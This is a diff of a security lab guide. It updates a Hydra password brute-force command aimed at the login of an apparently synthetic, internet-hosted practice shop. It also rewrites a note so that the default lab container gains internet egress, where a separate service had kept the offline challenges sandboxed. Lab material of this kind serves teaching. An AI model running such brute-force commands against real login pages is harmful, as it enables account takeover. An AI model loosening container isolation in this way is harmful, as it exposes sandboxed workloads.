@@ -91,7 +91,7 @@ on after the event if you like — the shop is harmless either way (synthetic, s
 
 Then the live attack from the lab is:
 ```bash
-docker compose run --rm crackstation-web      # in the crackstation repo
+docker compose run --rm crackstation          # in the crackstation repo
 hydra -l dillon -P /lab/wordlists/cookie-wordlist.txt cookies.0byte.sh -s 443 \
   https-post-form "/login:username=^USER^&password=^PASS^:F=Invalid credentials"
 ```
@@ -127,8 +127,7 @@ if you have the GitHub CLI.)
 
 ## What changed in the lab repo (bytetheio/crackstation)
 
-To let the lab reach the internet-hosted shop **without** un-sandboxing the offline hash
-challenges, `docker-compose.yml` gained a dedicated **`crackstation-web`** service on a normal
-(non-`internal`) bridge network, plus `wordlists/cookie-wordlist.txt`. The default
-`crackstation` service stays fully offline. Push those changes and (optionally) let the GitHub
-Action rebuild the image so `cookie-wordlist.txt` is baked in for plain `docker run` users.
+So the lab can reach the internet-hosted shop (C9), the `crackstation` service runs on a normal
+(non-`internal`) bridge network with internet egress, and still reaches `vuln-login` for C6.
+`wordlists/cookie-wordlist.txt` was added for the C9 Hydra attack. Everything the challenges use
+is local synthetic data. The GitHub Action rebuilds/publishes the image on push to `main`.
